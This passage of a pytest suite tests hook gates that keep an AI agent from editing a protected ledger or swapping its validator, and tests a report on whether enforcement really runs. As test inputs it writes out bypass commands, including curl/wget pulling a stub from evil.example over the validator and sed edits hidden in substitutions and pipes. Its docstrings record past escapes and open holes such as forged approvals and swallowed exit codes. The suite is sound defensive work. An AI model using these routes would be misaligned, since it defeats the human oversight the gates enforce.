    "python scripts/ledger_add.py --validate ledger/2026.csv && git commit -m x",
])
def test_reading_the_ledger_and_committing_is_allowed(tmp_path, command):
    """Judging the WHOLE command called `grep … > /tmp/hits && git commit` a write, because a `>`
    appeared somewhere in it. Per SEGMENT, the verb that decides is the one in the same breath as
    the path — which fixed both over-blocks for free.

    `python scripts/ledger_add.py …` is exempt as the VALIDATED write path: it refuses bad data
    before writing, so a row it produces is valid by construction. No other interpreter invocation
    gets that credit."""
    ledger_repo(tmp_path)
    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 0, command


@pytest.mark.parametrize("command", [
    'git commit -a -m <(sed -i s/1/2/ ledger/2026.csv)',
    'git commit -m "$(sed -i s/1/2/ ledger/2026.csv)"',
    'git commit -m "`sed -i s/1/2/ ledger/2026.csv`"',
])
def test_a_substitution_opens_its_own_segment(tmp_path, command):
    """A REGRESSION the round-9 rewrite introduced and this test exists to hold shut: with the
    whole command as one segment, the verb is `git commit` — read-only as far as the ledger goes —
    and the `sed -i` inside the substitution was never examined. The round-6 bypass, re-opened by
    the round-9 fix, which is exactly what a rewrite is most likely to do."""
    ledger_repo(tmp_path)
    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2, command


# -- round 10: the pipe, the decoy validator, the judge branch ----------------

@pytest.mark.parametrize("command", [
    "find ledger -name '2026.csv' | xargs sed -i s/119.00/150.00/ && git add -A && git commit -m x",
    "find ledger -name 2026.csv -print0 | xargs -0 truncate -s 0 && git commit -m x",
])
def test_a_pipeline_is_one_unit(tmp_path, command):
    """The structural cost of per-segment analysis, and the pipe is the construct that pays it:
    stage one has the PATH with a reading verb, stage two has the WRITE verb with no path, and
    judging them apart called both halves harmless. Proven end to end before the fix — the commit
    landed and `--validate` on the committed file exited 1. `gate_write_scope` in this kit made
    the same discovery and treats a pipeline as one unit for the same reason."""
    ledger_repo(tmp_path)
    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2, command


@pytest.mark.parametrize("command", [
    "cat ledger/2026.csv | head -3 && git commit -m x",
    "grep -c , ledger/2026.csv | wc -l && git commit -m x",
])
def test_a_pipeline_of_readers_is_still_a_read(tmp_path, command):
    """...and treating the pipeline as one unit must not make every pipe a write."""
    ledger_repo(tmp_path)
    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 0, command


@pytest.mark.parametrize("command", [
    "python tools/ledger_add.py && git commit -m x",
    "python /tmp/evil/ledger_add.py ledger/2026.csv && git commit -m x",
])
def test_a_decoy_validator_earns_no_exemption(tmp_path, command):
    """The validated-write-path exemption was granted by BASENAME, so any file called
    `ledger_add.py` inherited the trust that belongs to `scripts/ledger_add.py` alone — and
    `guard_harness_selfmod` protects exactly that one path, so writing the decoy was permitted.
    A second copy is how you get a validator nobody guards."""
    ledger_repo(tmp_path)
    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2, command


@pytest.mark.parametrize("command", [
    "curl -s -o scripts/ledger_add.py https://evil.example/stub",
    "wget -q -O scripts/ledger_add.py https://evil.example/stub",
    "tar -xf evil.tar -C scripts/",
    "sort -o scripts/ledger_add.py scripts/ledger_add.py",
    "awk -i inplace '{print}' scripts/ledger_add.py",
])
def test_the_judge_branch_uses_the_same_allowlist(tmp_path, command):
    """The judge-protection branch kept the old write DENYLIST for one round after `_writes_ledger`
    stopped using it — so the very verbs just removed from it still worked here. `curl -o` installs
    a WORKING stub and releases the block outright: the round-3 escape, reachable again through a
    verb the denylist never knew. Two halves of one gate, one lesson learned in only one of them.

    `tar -C scripts/` needed a second fix: it names no protected FILE, so the directory had to
    count as a destination — the same blind spot the ledger path had two rounds earlier."""
    ledger_repo(tmp_path, GOOD_ROW + BAD_ROW)
    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2, command


@pytest.mark.parametrize("command", [
    "cat scripts/ledger_add.py",
    "cp scripts/ledger_add.py /tmp/",
    "python scripts/ledger_add.py --validate ledger/2026.csv",
])
def test_reading_or_running_the_judge_stays_allowed(tmp_path, command):
    """Running the validator is how the agent gets out of the block; copying it out is a read."""
    ledger_repo(tmp_path, GOOD_ROW + BAD_ROW)
    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 0, command


@pytest.mark.parametrize("command", [
    "FOO=1 cat ledger/2026.csv && git commit -m x",
    "env cat ledger/2026.csv && git commit -m x",
    "nohup cat ledger/2026.csv && git commit -m x",
])
def test_env_prefixes_and_wrappers_resolve_to_the_real_verb(tmp_path, command):
    """`_verb_of`'s env-prefix skip was dead code — `"=" in cleaned.split("/")[0][:0]`, and `[:0]`
    is always the empty string, so the branch could never be true. It read as a handled case."""
    ledger_repo(tmp_path)
    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 0, command


# -- step 8: the enforcement capability matrix --------------------------------

def doctor_project(tmp_path, wired=(), kit_state=None, real_files=True, extra=None):
    """A project whose settings register the named hooks WITH their matchers.

    `wired` entries are `(filename, [(event, matcher), ...])`. The matcher is part of the fixture
    because it is part of the question: a gate registered for the wrong tools never fires, and a
    first cut of the matrix did not read it — so four settings shapes in which nothing was
    enforced reported `enforcement: hard`.
    """
    root = tmp_path / "proj"
    os.makedirs(str(root / "project_memory"), exist_ok=True)
    hooks_dir = root / ".claude" / "hooks"
    os.makedirs(str(hooks_dir), exist_ok=True)
    hooks = {}
    for name, registrations in wired:
        if real_files:
            write(str(hooks_dir / name), "# gate\n")
        for event, matcher in registrations:
            entries = hooks.setdefault(event, [])
            target = next((e for e in entries if e["matcher"] == matcher), None)
            if target is None:
                target = {"matcher": matcher, "hooks": []}
                entries.append(target)
            target["hooks"].append(
                {"type": "command",
                 "command": 'python "${CLAUDE_PROJECT_DIR}/.claude/hooks/%s"' % name})
    settings = dict({"hooks": hooks}, **(extra or {}))
    write(str(root / ".claude" / "settings.json"), json.dumps(settings))
    if kit_state is not None:
        if kit_state.get("hook_bundle_hash") == "AUTO":
            kit_state = dict(kit_state, hook_bundle_hash=_expected_bundle_hash(str(root)))
        write(str(root / ".claude" / "kit_state.json"), json.dumps(kit_state))
    sys.path.insert(0, TEAM_KITS)
    from kernel.state import ProjectState
    return str(root), ProjectState(str(root / "project_memory"))


def _expected_bundle_hash(root):
    sys.path.insert(0, TEAM_KITS)
    from kernel.report import _hook_bundle_hash
    return _hook_bundle_hash(root)


ALL_WIRED = (
    ("gate_dispatch.py", [("PreToolUse", "Agent|Task")]),
    ("gate_approval.py", [("PreToolUse", "AskUserQuestion"),
                          ("PostToolUse", "AskUserQuestion")]),
    ("gate_write_scope.py", [("PreToolUse", "Edit|Write|MultiEdit|Bash|PowerShell")]),
)


def doctor_of(tmp_path, **kw):
    sys.path.insert(0, TEAM_KITS)
    from kernel import report
    _root, state = doctor_project(tmp_path, **kw)
    return report.doctor(state)


@pytest.mark.parametrize("wired,capability", [
    # the matcher EXCLUDES the tool the gate exists for
    ((("gate_dispatch.py", [("PreToolUse", "Edit|Write")]),), "spawn_veto"),
    ((("gate_write_scope.py", [("PreToolUse", "Edit|Write|MultiEdit")]),),
     "state_write_protection.shell"),
    # ...or names a tool that does not exist
    ((("gate_dispatch.py", [("PreToolUse", "NoSuchTool")]),), "spawn_veto"),
    # ...or the gate is on an event that cannot deny
    ((("gate_dispatch.py", [("PostToolUse", "Agent|Task")]),), "spawn_veto"),
])
def test_a_registration_that_cannot_fire_is_not_enforcement(tmp_path, wired, capability):
    """The matcher is a TOOL-NAME FILTER, and a first cut never read it — so `gate_dispatch`
    registered for `Edit|Write` counted as a spawn veto. Every shipped kit uses per-tool matchers,
    so a one-token typo silently upgraded a project to `hard`. This is the same failure the
    `.file`/`.shell` split exists to prevent, reached through a different door."""
    result = doctor_of(tmp_path, wired=wired, kit_state={"state": "active",
                                                         "hook_bundle_hash": "AUTO"})
    assert result["capabilities"][capability] == "unverified"
    assert result["enforcement"] == "audited"


def test_the_global_kill_switch_is_read(tmp_path):
    """`disableAllHooks` is Claude Code's documented off switch. With it set, nothing runs — and
    the matrix reported every capability verified."""
    result = doctor_of(tmp_path, wired=ALL_WIRED,
                       kit_state={"state": "active", "hook_bundle_hash": "AUTO"},
                       extra={"disableAllHooks": True})
    assert result["enforcement"] == "audited"
    assert set(result["capabilities"].values()) == {"unverified"}


@pytest.mark.parametrize("tail", ["; exit 0", "|| exit 0", "; true", "|| true", "; :", "|| :",
                                  "\nexit 0", "& exit 0", "&& exit 0"])
def test_every_way_of_throwing_the_exit_code_away_is_seen(tail):
    """Exit 2 is the only code Claude Code blocks on, so a wrapper that rewrites the status turns
    a gate into a log line. The first pattern knew two spellings and two separators — a wrapper
    written across two lines, or joined with `&`, or ending in sh's `:` no-op, read as
    enforcement. Over-eager on purpose: a false positive costs a look at the settings, a false
    negative costs the guarantee."""
    sys.path.insert(0, TEAM_KITS)
    from kernel.report import _swallows_exit_code
    assert _swallows_exit_code('python .claude/hooks/gate_dispatch.py%s' % tail), tail
    assert not _swallows_exit_code('python .claude/hooks/gate_dispatch.py')
    # ...and a gate that legitimately ends in a non-zero exit is not "swallowing"
    assert not _swallows_exit_code('python .claude/hooks/gate_dispatch.py; exit 2')


def test_the_report_says_when_it_describes_only_one_provider(tmp_path):
    """SPEC-DEVIATION. The matrix reads `.claude/settings.json` and the layers Claude Code merges;
    a project that also runs Codex enforces through `.codex/hooks.json`, a separate file with its
    own event set. One matrix over a two-provider project is narrower than it looks, and II.8 asks
    for the mode of the INSTALLATION."""
    root, state = doctor_project(tmp_path, wired=ALL_WIRED,
                                 kit_state={"state": "active", "hook_bundle_hash": "AUTO"})
    sys.path.insert(0, TEAM_KITS)
    from kernel import report
    assert not any("Codex surface" in n for n in report.doctor(state)["environment_notes"])
    os.makedirs(os.path.join(root, ".codex"), exist_ok=True)
    write(os.path.join(root, ".codex", "hooks.json"), "{}")
    assert any("Codex surface" in n for n in report.doctor(state)["environment_notes"])


def test_the_user_level_kill_switch_is_read_too(tmp_path, monkeypatch):
    """`disableAllHooks` most often lives in `~/.claude/settings.json` — someone who wants hooks
    off wants them off everywhere. Doctor read only the project's two files, so exactly the
    likeliest way to turn enforcement off was the one it could not see, and it reported full
    enforcement over a session in which nothing ran."""
    config = tmp_path / "userconfig"
    os.makedirs(str(config), exist_ok=True)
    write(str(config / "settings.json"), json.dumps({"disableAllHooks": True}))
    monkeypatch.setenv("CLAUDE_CONFIG_DIR", str(config))
    result = doctor_of(tmp_path / "proj", wired=ALL_WIRED,
                       kit_state={"state": "active", "hook_bundle_hash": "AUTO"})
    assert result["hooks_disabled"] is True
    assert set(result["capabilities"].values()) == {"unverified"}


def test_a_project_cannot_re_enable_hooks_over_a_user_kill_switch(tmp_path, monkeypatch):
    """Precedence deliberately NOT applied. The question is not "what is configured" but "could a
    hook have been suppressed", and the permissive answer to that is the one that produces a
    report claiming enforcement that never ran. Being wrong in the strict direction costs someone
    a look at the config; being wrong the other way costs the guarantee."""
    config = tmp_path / "userconfig"
    os.makedirs(str(config), exist_ok=True)
    write(str(config / "settings.json"), json.dumps({"disableAllHooks": True}))
    monkeypatch.setenv("CLAUDE_CONFIG_DIR", str(config))
    result = doctor_of(tmp_path / "proj", wired=ALL_WIRED,
                       kit_state={"state": "active", "hook_bundle_hash": "AUTO"},
                       extra={"disableAllHooks": False})
    assert result["hooks_disabled"] is True


def test_a_registration_pointing_at_a_missing_file_is_not_enforcement(tmp_path):
    result = doctor_of(tmp_path, wired=ALL_WIRED, real_files=False,
                       kit_state={"state": "active", "hook_bundle_hash": "AUTO"})
    assert result["capabilities"]["spawn_veto"] == "unverified"


def test_a_command_that_only_mentions_a_gate_is_not_enforcement(tmp_path):
    """"It appears in the settings, therefore it enforces" is the reasoning this whole matrix
    exists to reject."""
    root = tmp_path / "proj"
    os.makedirs(str(root / "project_memory"), exist_ok=True)
    os.makedirs(str(root / ".claude" / "hooks"), exist_ok=True)
    write(str(root / ".claude" / "hooks" / "gate_dispatch.py"), "# gate\n")
    write(str(root / ".claude" / "settings.json"), json.dumps({"hooks": {"PreToolUse": [
        {"matcher": "*", "hooks": [
            {"type": "command", "command": 'echo "see gate_dispatch.py for details"'}]}]}}))
    sys.path.insert(0, TEAM_KITS)
    from kernel import report
    from kernel.state import ProjectState
    result = report.doctor(ProjectState(str(root / "project_memory")))
    assert result["capabilities"]["spawn_veto"] == "unverified"


def test_an_invocation_that_swallows_the_exit_code_is_not_enforcement(tmp_path):
    """Only exit 2 blocks. `sh -c "python gate.py; exit 0"` discards the verdict, so the hook can
    never refuse anything — it is a log line wearing a gate's name."""
    root = tmp_path / "proj"
    os.makedirs(str(root / "project_memory"), exist_ok=True)
    os.makedirs(str(root / ".claude" / "hooks"), exist_ok=True)
    write(str(root / ".claude" / "hooks" / "gate_dispatch.py"), "# gate\n")
    write(str(root / ".claude" / "settings.json"), json.dumps({"hooks": {"PreToolUse": [
        {"matcher": "*", "hooks": [
            {"type": "command",
             "command": 'sh -c "python .claude/hooks/gate_dispatch.py; exit 0"'}]}]}}))
    sys.path.insert(0, TEAM_KITS)
    from kernel import report
    from kernel.state import ProjectState
    result = report.doctor(ProjectState(str(root / "project_memory")))
    assert result["capabilities"]["spawn_veto"] == "unverified"


def test_an_asserted_hole_outranks_a_green_wiring_check(tmp_path):
    """THE correction. A first cut reported a capability `verified` while a `known_hole` test
    asserted an open path for it, filed the pair under `documented_residuals` and called it "not
    an error". But `tools/conftest.py` — written in the same change set — defines the marker's
    contract as "the named capability must be reported `unverified` while this test passes", and
    the only residual any USER decision covers is a user who deliberately types the mint code.
    The shipped holes are agent-side: two authored files mint, and rewriting `sys.modules` mints
    without running the hook. Those are not residuals of a verified capability."""
    result = doctor_of(tmp_path, wired=ALL_WIRED,
                       kit_state={"state": "active", "hook_bundle_hash": "AUTO"})
    assert result["known_holes_source"] == "sidecar"
    for name in result["known_holes"]:
        assert name in result["capabilities"], "%s names no capability" % name
        assert result["capabilities"][name] == "unverified", name
    assert result["enforcement"] == "audited"
    assert result["unknown_hole_capabilities"] == []


def test_known_holes_sidecar_is_regenerated_and_matches(tmp_path):
    """The pin. Adding, renaming or deleting a `known_hole` marker without regenerating the
    sidecar has to FAIL here, because the enumeration is what forces a capability down and a
    stale one silently stops forcing. Regenerate + diff rather than "count the markers": the
    second only proves the generator agrees with itself."""
    proc = subprocess.run(
        [sys.executable, os.path.join(ROOT, "tools", "gen_known_holes.py"), "--check"],
        capture_output=True, text=True)
    assert proc.returncode == 0, (
        "team-kits/kernel/known_holes.json is stale — run `python tools/gen_known_holes.py`.\n"
        + proc.stderr)
    # ...and it must name the markers this very file carries, so the two cannot drift while both
    # stay internally consistent.
    with open(os.path.join(TEAM_KITS, "kernel", "known_holes.json"), encoding="utf-8") as handle:
        sidecar = json.load(handle)
    with open(__file__, encoding="utf-8") as handle:
        source = handle.read()
    for capability, tests in sidecar["capabilities"].items():
        for name in tests:
            assert ("def %s(" % name) in source, "%s/%s is not in this file" % (capability, name)


def test_a_missing_sidecar_is_loud_and_never_reads_as_no_holes(tmp_path, monkeypatch):
    """The incentive test. `[]` and "could not look" are opposite claims, and the first cut
    returned `[]` for both — so DELETING one ordinary file would have silenced every asserted
    hole and produced a GREENER report than a correct install. Removing the enumeration must
    instead cost every green verdict and raise an error finding."""
    sys.path.insert(0, TEAM_KITS)
    from kernel import report
    monkeypatch.setattr(report, "_known_hole_capabilities", lambda: ([], None))
    result = doctor_of(tmp_path, wired=ALL_WIRED,
                       kit_state={"state": "active", "hook_bundle_hash": "AUTO"})
    assert result["known_holes"] is None, "an unreadable enumeration must not report as []"
    assert result["known_holes_source"] is None
    assert set(result["capabilities"].values()) == {"unverified"}
    assert result["enforcement"] == "audited"
    assert any(f["item"] == "kernel/known_holes.json"
               for f in result["installation_errors"])


def test_the_sidecar_travels_with_the_kernel_package(tmp_path):
    """The whole point of a sidecar over a scan of `tools/`: the answer must not depend on where
    the kernel package sits. Proven by COPYING the package somewhere with no harness around it and
    asking there — in a subprocess, because this process already has `kernel` imported and would
    answer from the checkout. Second half: with the file removed, the same copy must say "could
    not look" rather than "no holes"."""
    home = tmp_path / "elsewhere"
    shutil.copytree(os.path.join(TEAM_KITS, "kernel"), str(home / "kernel"),
                    ignore=shutil.ignore_patterns("__pycache__"))
    probe = ("import sys; sys.path.insert(0, %r); from kernel import report; "
             "print(report._known_hole_capabilities())" % str(home))
    out = subprocess.run([sys.executable, "-c", probe], capture_output=True, text=True)
    assert out.returncode == 0, out.stderr
    assert "'sidecar'" in out.stdout, out.stdout
    assert "approval_provenance" in out.stdout, out.stdout
    os.remove(str(home / "kernel" / "known_holes.json"))
    gone = subprocess.run([sys.executable, "-c", probe], capture_output=True, text=True)
    assert gone.returncode == 0, gone.stderr
    assert gone.stdout.strip() == "([], None)", gone.stdout


TAMPERS = [
    ("deleted", None),
    ("emptied", '{"schema": 1, "capabilities": {}}\n'),
    ("one hole dropped", '{"schema": 1, "capabilities": {"approval_provenance": []}}\n'),
    ("renamed to nothing", '{"schema": 1, "capabilities": {"nonsense": []}}\n'),
    ("truncated", '{"schema": 1, "capabi'),
    ("not a mapping", "[]\n"),
    ("re-encoded with a BOM", '﻿{"schema": 1, "capabilities": {}}\n'),
]
# ...and the DIGEST module beside it. Its truncation used to raise SyntaxError straight out of
# `doctor()` — a traceback and a ZERO-byte report, at exactly the moment the report is the thing
# someone needs, and for exactly the "half-finished kit update" this layer exists for.
DIGEST_TAMPERS = [
    ("digest deleted", None),
    ("digest truncated mid-write", "KNOWN_HOLES_SHA256 = 'abc"),
    ("digest is not python at all", "\x00\x01 nonsense\n"),
    ("digest names another value", "KNOWN_HOLES_SHA256 = 'deadbeef'\n"),
]


@pytest.mark.parametrize("label,content", DIGEST_TAMPERS, ids=[t[0] for t in DIGEST_TAMPERS])
def test_a_damaged_digest_module_is_reported_not_raised(tmp_path, label, content):
    """Every one of these must reach the same quiet place — `([], None)`, which the report turns
    into `known_holes: null` and an installation error. A crash is not a report."""
    home = tmp_path / "elsewhere"
    shutil.copytree(os.path.join(TEAM_KITS, "kernel"), str(home / "kernel"),
                    ignore=shutil.ignore_patterns("__pycache__"))
    target = home / "kernel" / "known_holes_digest.py"
    if content is None:
        os.remove(str(target))
    else:
        target.write_text(content, encoding="utf-8")
    probe = ("import sys; sys.path.insert(0, %r); from kernel import report; "
             "print(report._known_hole_capabilities())" % str(home))
    out = subprocess.run([sys.executable, "-c", probe], capture_output=True, text=True)
    assert out.returncode == 0, "%s: doctor died instead of reporting\n%s" % (label, out.stderr)
    assert out.stdout.strip() == "([], None)", (label, out.stdout)


@pytest.mark.parametrize("label,content", TAMPERS, ids=[t[0] for t in TAMPERS])
def test_no_edit_to_the_sidecar_pays(tmp_path, label, content):
    """THE incentive property, and the first cut only had half of it. Deleting the file cost every
    capability — but writing `{"capabilities": {}}` over it silenced every asserted hole for FREE
    and turned `state_write_protection.shell` green. The cheapest tamper was the profitable one,
    which is precisely the arrangement "an open hole outranks a green check" cannot survive.

    Every deviation must now land in the same place. Measured in a subprocess against a real copy
    of the kernel, because that is what a project runs."""
    home = tmp_path / "elsewhere"
    shutil.copytree(os.path.join(TEAM_KITS, "kernel"), str(home / "kernel"),
                    ignore=shutil.ignore_patterns("__pycache__"))
    sidecar = home / "kernel" / "known_holes.json"
    if content is None:
        os.remove(str(sidecar))
    else:
        sidecar.write_text(content, encoding="utf-8")
    probe = ("import sys; sys.path.insert(0, %r); from kernel import report; "
             "print(report._known_hole_capabilities())" % str(home))
    out = subprocess.run([sys.executable, "-c", probe], capture_output=True, text=True)
    assert out.returncode == 0, out.stderr
    assert out.stdout.strip() == "([], None)", (
        "%s: the enumeration must read as UNAVAILABLE, not as fewer holes (%s)"
        % (label, out.stdout.strip()))


def test_what_the_digest_does_not_buy_is_written_down(tmp_path):
    """The honest half of the incentive story, and the reason the docstring next to it was
    rewritten. Editing the sidecar ALONE is caught; editing the sidecar AND its digest module is
    not — they sit in one directory behind one guard, and a comment claiming "any deviation lands
    in the same place" would be the repo's own worst failure mode: a promise the code does not
    keep, with the design then argued from the promise.

    What actually costs the two-file attacker is the enforcement BUNDLE hash, because both files
    are inside it. That is asserted here so the claim and the mechanism cannot drift apart."""
    home = tmp_path / "elsewhere"
    shutil.copytree(os.path.join(TEAM_KITS, "kernel"), str(home / "kernel"),
                    ignore=shutil.ignore_patterns("__pycache__"))
    sys.path.insert(0, TEAM_KITS)
    from kernel.hashing import hook_bundle_hash
    before = hook_bundle_hash(str(home))
    payload = '{"schema": 1, "capabilities": {}}\n'
    (home / "kernel" / "known_holes.json").write_text(payload, encoding="utf-8")
    (home / "kernel" / "known_holes_digest.py").write_text(
        "KNOWN_HOLES_SHA256 = %r\n" % hashlib.sha256(payload.encode("utf-8")).hexdigest(),
        encoding="utf-8")
    probe = ("import sys; sys.path.insert(0, %r); from kernel import report; "
             "print(report._known_hole_capabilities())" % str(home))
    out = subprocess.run([sys.executable, "-c", probe], capture_output=True, text=True)
    # the documented limit: consistent-but-false passes the digest
    assert out.stdout.strip() == "([], 'sidecar')", out.stdout + out.stderr
    # ...and the thing that does NOT depend on the attacker's diligence
    assert hook_bundle_hash(str(home)) != before, (
        "both files must be inside the enforcement bundle, or the two-file edit is free")


def test_a_drifted_marker_is_as_loud_as_a_missing_one(tmp_path, monkeypatch):
    """A marker naming a capability the matrix does not have is a cross-check that can never fire
    again — the comment called it "a real defect" while the code produced a quiet list entry and
    nothing else, quieter than a missing sidecar. It happened for real: splitting
    `state_write_protection` left two markers pointing at a name that no longer existed."""
    sys.path.insert(0, TEAM_KITS)
    from kernel import report
    monkeypatch.setattr(report, "_known_hole_capabilities", lambda: (["nonsense"], "sidecar"))
    result = doctor_of(tmp_path, wired=ALL_WIRED,
                       kit_state={"state": "active", "hook_bundle_hash": "AUTO"})
    assert result["unknown_hole_capabilities"] == ["nonsense"]
    assert any("nonsense" in f["message"] for f in result["installation_errors"])


def test_doctor_exits_nonzero_on_an_installation_defect(tmp_path):
    """`installation_errors` was documented as "the one place a reader cannot page past" while its
    only consumer printed one JSON blob and always exited 0 — so the loudest field in the report
    was a key in the middle of it. State findings keep their own channel; this is about the kit."""
    root, _state = doctor_project(tmp_path, wired=ALL_WIRED,
                                  kit_state={"state": "active", "hook_bundle_hash": "AUTO"})
    home = tmp_path / "kern"
    shutil.copytree(os.path.join(TEAM_KITS, "kernel"), str(home / "kernel"),
                    ignore=shutil.ignore_patterns("__pycache__"))
    os.remove(str(home / "kernel" / "known_holes.json"))
    proc = subprocess.run(
        [sys.executable, "-c",
         "import sys; sys.path.insert(0, %r); from kernel.cli import main; "
         "sys.exit(main(['--root', %r, 'doctor']))" % (str(home), os.path.join(root, "project_memory"))],
        capture_output=True, text=True)
    assert proc.returncode == 1, proc.stdout[-500:] + proc.stderr[-500:]
    assert "[INSTALLATION]" in proc.stderr


def test_the_enumeration_is_taken_from_pytest_not_from_a_list_of_spellings(tmp_path):
    """The decorator walk was an ENUMERATION OF SPELLINGS, and a review found eight that pytest
    honours and it missed — a marker on a class, module-level `pytestmark` (bare and in a list),
    `pytest.param(marks=...)`, the keyword form `known_hole(capability="x")` that conftest itself
    documents, an aliased decorator, an f-string, a constant. Every miss is silent and in the
    dangerous direction. Asking pytest covers the spelling nobody has thought of yet, so this test
    writes the ones that used to be missed and expects all of them back."""
    probe = tmp_path / "test_spellings.py"
    probe.write_text(
        'import pytest\n'
        'CAP = "spawn_veto"\n'
        'ALIAS = pytest.mark.known_hole\n'
        'pytestmark = [pytest.mark.known_hole("module_level")]\n'
        '\n'
        '@pytest.mark.known_hole(capability="by_keyword")\n'
        'def test_kw(): pass\n'
        '\n'
        '@ALIAS("by_alias")\n'
        'def test_alias(): pass\n'
        '\n'
        '@pytest.mark.known_hole(CAP)\n'
        'def test_constant(): pass\n'
        '\n'
        '@pytest.mark.known_hole("on_a_class")\n'
        'class TestGroup:\n'
        '    def test_inside(self): pass\n'
        '\n'
        '@pytest.mark.parametrize("x", [pytest.param(1, marks=pytest.mark.known_hole("via_param"))])\n'
        'def test_param(x): pass\n'
        '\n'
        '# @pytest.mark.known_hole("in_a_comment")\n'
        'PLANTED = \'pytest.mark.known_hole("in_a_string")\'\n',
        encoding="utf-8")
    conftest = tmp_path / "conftest.py"
    shutil.copyfile(os.path.join(ROOT, "tools", "conftest.py"), str(conftest))
    import importlib.util
    spec = importlib.util.spec_from_file_location(
        "gen_probe", os.path.join(ROOT, "tools", "gen_known_holes.py"))
    gen = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(gen)
    gen.ROOT = str(tmp_path)
    gen.SOURCES = ("test_spellings.py",)
    found = gen.collect()
    assert set(found) == {"module_level", "by_keyword", "by_alias", "spawn_veto", "on_a_class",
                          "via_param"}, found
    # ...and the false-positive direction stays closed: neither the comment nor the string counts
    assert "in_a_comment" not in found and "in_a_string" not in found


def test_the_generator_refuses_to_write_an_enumeration_it_could_not_take(tmp_path):
    """The producer had the same "could not look = nothing found" defect the consumer exists to
    correct: a renamed or half-written source file was skipped with `continue`, so the generator
    wrote a valid, EMPTY sidecar and `--check` went green on it. Rule 2 was then permanently off,
    announced by one line of stderr."""
    import importlib.util
    spec = importlib.util.spec_from_file_location(
        "gen_probe2", os.path.join(ROOT, "tools", "gen_known_holes.py"))
    gen = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(gen)
    gen.ROOT = str(tmp_path)
    gen.SOURCES = ("test_does_not_exist.py",)
    gen.TARGET = str(tmp_path / "known_holes.json")
    gen.DIGEST_TARGET = str(tmp_path / "known_holes_digest.py")
    with pytest.raises(SystemExit):
        gen.main()
    assert not os.path.exists(gen.TARGET), "an unreadable source must write nothing at all"


def test_the_report_says_whether_a_better_mode_is_even_reachable(tmp_path):
    """`enforcement: audited` answers "are you hard?" and never "could you be?". A perfectly wired
    project and a misconfigured one printed the same word, and only one of them was worth an
    afternoon. The ceiling names the capabilities no configuration can raise, and WHY."""
    result = doctor_of(tmp_path, wired=ALL_WIRED,
                       kit_state={"state": "active", "hook_bundle_hash": "AUTO"})
    assert result["enforcement"] == "audited"
    assert result["enforcement_ceiling"] == "audited"
    ceiling = result["enforcement_ceiling_reasons"]
    # exactly the structurally-blocked ones, not everything that happens to be unmet
    assert set(ceiling) == {"approval_provenance", "hook_trust",
                            "state_write_protection.shell"}, ceiling
    assert "known_hole" in ceiling["state_write_protection.shell"]
    assert "PERMISSION posture" in ceiling["approval_provenance"]
    # a merely UNWIRED capability is a blocker, never a ceiling reason — that is the distinction
    broken = doctor_of(tmp_path / "b", wired=(("gate_approval.py", [("PreToolUse", "Nope")]),),
                       kit_state={"state": "active", "hook_bundle_hash": "AUTO"})
    assert "spawn_veto" in broken["enforcement_blockers"]
    assert "spawn_veto" not in broken["enforcement_ceiling_reasons"]


def test_each_mechanism_holds_the_ceiling_on_its_own(tmp_path, monkeypatch):
    """THE masking test. `approval_provenance` is pulled down by TWO independent mechanisms — the
    wiring verdict that refuses to claim an unmeasurable condition, and the `known_hole`
    enumeration — and a review proved the consequence: reverting the first to the naive check it
    started as (the round-1 defect, "is `_assert_minting_caller` an attribute?") passed the ENTIRE
    suite, because the second pulled it down anyway. Two safety nets are only worth two if each is
    tested with the other removed."""
    sys.path.insert(0, TEAM_KITS)
    from kernel import report
    # mechanism 1 alone: the enumeration is readable and EMPTY
    monkeypatch.setattr(report, "_known_hole_capabilities", lambda: ([], "sidecar"))
    alone = doctor_of(tmp_path / "a", wired=ALL_WIRED,
                      kit_state={"state": "active", "hook_bundle_hash": "AUTO"})
    assert alone["known_holes"] == []
    assert alone["capabilities"]["approval_provenance"] == "unverified", (
        "with the enumeration empty, the wiring verdict alone must still refuse to claim "
        "provenance — otherwise the round-1 regress is invisible")
    assert "approval_provenance" in alone["enforcement_ceiling_reasons"]
    # mechanism 2 alone: pretend the wiring verdict was raised, and let the enumeration answer
    monkeypatch.setattr(report, "_known_hole_capabilities",
                        lambda: (["spawn_veto"], "sidecar"))
    only_enum = doctor_of(tmp_path / "b", wired=ALL_WIRED,
                          kit_state={"state": "active", "hook_bundle_hash": "AUTO"})
    assert only_enum["capabilities"]["spawn_veto"] == "unverified", (
        "the enumeration must pull down a capability whose wiring check PASSED")
    assert "spawn_veto" in only_enum["enforcement_ceiling_reasons"]


def test_approval_provenance_says_what_it_cannot_measure(tmp_path):
    """Condition (ii) of the user's decision — `mint()` reachable only from the PostToolUse hook —
    is one library code cannot establish about itself, which `approvals.mint` says in its own
    docstring. A first cut "checked" it by asking whether `_assert_minting_caller` was a callable
    attribute; deleting the CALL left that True and every test green."""
    result = doctor_of(tmp_path, wired=ALL_WIRED,
                       kit_state={"state": "active", "hook_bundle_hash": "AUTO"})
    assert result["capabilities"]["approval_provenance"] == "unverified"
    assert "PERMISSION posture" in result["capability_reasons"]["approval_provenance"]


def test_hook_trust_compares_a_real_hash(tmp_path):
    """A first cut returned verified whenever `kit_state.json` said `active` and carried ANY hash
    — so a project with no hooks at all read "the installed hook bundle matches the trusted
    hash". Nothing was matched."""
    stale = doctor_of(tmp_path / "a", wired=ALL_WIRED,
                      kit_state={"state": "active", "hook_bundle_hash": "abc"})
    assert stale["capabilities"]["hook_trust"] == "unverified"
    assert "changed since it was trusted" in stale["capability_reasons"]["hook_trust"]
    fresh = doctor_of(tmp_path / "b", wired=ALL_WIRED,
                      kit_state={"state": "active", "hook_bundle_hash": "AUTO"})
    # The WIRING verdict is what this test is about, and it is now visible only in the reason:
    # `hook_trust` carries a `known_hole` (an agent that can run scripts can forge a trust record),
    # so rule 2 pulls the capability down whatever the hash says. Asserting the reason rather than
    # the verdict keeps the two mechanisms apart — the mistake that let the round-1 provenance
    # regress hide behind the enumeration for a whole round.
    assert "hashes to the value the project recorded" in fresh["capability_reasons"]["hook_trust"]
